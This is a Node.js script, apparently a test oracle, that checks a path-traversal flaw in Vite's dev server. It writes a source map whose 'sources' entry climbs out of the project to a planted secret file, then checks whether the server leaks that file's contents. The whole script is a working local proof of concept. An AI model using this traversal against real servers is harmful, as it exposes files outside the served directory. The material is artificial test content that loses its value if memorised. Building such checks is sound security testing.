const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';
  let server;

  const marker = 'vite-map-traversal-' + Date.now() + '-' + Math.random().toString(16).slice(2);

  try {
    const base = path.join(os.tmpdir(), marker);
    const root = path.join(base, 'project');
    const depsDir = path.join(root, 'node_modules', '.vite', 'deps');
    fs.mkdirSync(depsDir, { recursive: true });

    fs.writeFileSync(path.join(root, 'index.html'), '<!doctype html><html><body>ok</body></html>');

    const benignMapName = 'benign.js.map';
    const benignSourceName = 'inside-source.ts';
    fs.writeFileSync(path.join(depsDir, benignSourceName), 'export const ok = 1;');
    fs.writeFileSync(
      path.join(depsDir, benignMapName),
      JSON.stringify({ version: 3, file: 'benign.js', sources: [benignSourceName], names: [], mappings: 'AAAA' })
    );

    const secretValue = 'TOP_SECRET_' + marker;
    const secretPath = path.join(base, 'outside-secret.txt');
    fs.writeFileSync(secretPath, secretValue);

    const traversal = path.relative(depsDir, secretPath).split(path.sep).join('/');
    const maliciousMapName = 'malicious.js.map';
    fs.writeFileSync(
      path.join(depsDir, maliciousMapName),
      JSON.stringify({ version: 3, file: 'malicious.js', sources: [traversal], names: [], mappings: 'AAAA' })
    );

    const vite = require('vite');
    if (!vite || typeof vite.createServer !== 'function') throw new Error('vite.createServer unavailable');

    server = await vite.createServer({
      root,
      logLevel: 'silent',
      appType: 'custom',
      server: { middlewareMode: true },
      optimizeDeps: { noDiscovery: true, force: false }
    });

    const request = (url) => new Promise((resolve, reject) => {
      const req = { method: 'GET', url, headers: {} };
      const res = {
        statusCode: 200,
        headers: {},
        body: '',
        writableEnded: false,
        setHeader(k, v) { this.headers[String(k).toLowerCase()] = v; },
        getHeader(k) { return this.headers[String(k).toLowerCase()]; },
        removeHeader(k) { delete this.headers[String(k).toLowerCase()]; },
        hasHeader(k) { return Object.prototype.hasOwnProperty.call(this.headers, String(k).toLowerCase()); },
        writeHead(code, headers) {
          this.statusCode = code;
          if (headers && typeof headers === 'object') {
            for (const key of Object.keys(headers)) this.setHeader(key, headers[key]);
          }
          return this;
        },
        write(chunk) { if (chunk != null) this.body += String(chunk); return true; },
        end(chunk) {
          if (chunk != null) this.body += String(chunk);
          this.writableEnded = true;
          resolve({ statusCode: this.statusCode || 200, headers: this.headers, body: this.body });
        }
      };

      try {
        server.middlewares(req, res, () => {
          if (!res.writableEnded) resolve({ statusCode: res.statusCode || 404, headers: res.headers, body: res.body || '' });
        });
      } catch (e) {
        reject(e);
      }
    });

    const benignResp = await request('/node_modules/.vite/deps/' + benignMapName);
    const benignBody = String((benignResp && benignResp.body) || '');
    const benignStatus = benignResp ? benignResp.statusCode : 0;

    let benignJson = null;
    try { benignJson = JSON.parse(benignBody); } catch (_) {}

    const benignGood = benignStatus >= 200 && benignStatus < 300 && benignJson && Array.isArray(benignJson.sources);
    if (!benignGood) {
      throw new Error('benign_failed status=' + benignStatus + ' len=' + benignBody.length);
    }

    operation_completed = true;

    let malResp;
    try {
      malResp = await request('/node_modules/.vite/deps/' + maliciousMapName);
    } catch (e) {
      exploit_succeeded = false;
      evidence = 'blocked_exception=' + (e && e.message ? e.message : String(e));
      console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
      return;
    }

    const malBody = String((malResp && malResp.body) || '');
    let malJson = null;
    try { malJson = JSON.parse(malBody); } catch (_) {}

    let leaked = false;
    if (malBody.includes(secretValue)) leaked = true;
    if (!leaked && malJson && Array.isArray(malJson.sourcesContent)) {
      for (const s of malJson.sourcesContent) {
        if (typeof s === 'string' && s.includes(secretValue)) { leaked = true; break; }
      }
    }

    exploit_succeeded = leaked;
    evidence = 'marker=' + marker + ',benign_status=' + benignStatus + ',mal_status=' + (malResp ? malResp.statusCode : 0) + ',mal_len=' + malBody.length + ',leak=' + leaked;
  } catch (err) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup_or_benign_failure=' + (err && err.message ? err.message : String(err));
  } finally {
    try { if (server) await server.close(); } catch (_) {}
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();